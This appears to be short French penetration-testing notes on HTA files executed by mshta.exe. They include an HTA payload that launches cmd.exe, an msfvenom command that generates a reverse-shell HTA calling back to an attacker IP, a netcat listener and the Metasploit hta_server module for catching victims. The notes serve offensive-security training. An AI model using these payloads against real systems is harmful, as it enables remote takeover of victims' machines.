HTA (Application HTML)  qui sont  des pages `HTML dynamiques` contenant JScript et VBScript. 

L'outil `mshta.exe` LOLBINS (Living-of-the-land Binaries)  est utilisé pour exécuter les fichiers HTA . Il peut être exécuté seul ou automatiquement depuis Internet Explorer.

Soit le fichier `index.hta` notre charge utile pour exécuter  `cmd.exe`

```html
<html>
	<head>
		<script>
			var c = 'cmd.exe'
			new ActiveXObject('WScript.Shell').Run(c);
		</script>
	</head>
	<body>
		<script>
			self.close();
		</script>
	</body>
</html>
```

---
**HTA Reverse Connection**
Nous pouvons créer une charge utile de shell inversé avec `msfvenom`. Une fois que la victime visite l’URL malveillante et clique sur Exécuter, nous récupérons la connexion.

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o payload.hta
```

```sh
nc -nlvp 443
```

---
**Malicious HTA via Metasploit**

```c
use exploit/windows/misc/hta_server
```

Sur la machine victime, une fois que nous visitons le fichier HTA malveillant fourni comme URL par Metasploit , nous devrions recevoir une connexion inversée.

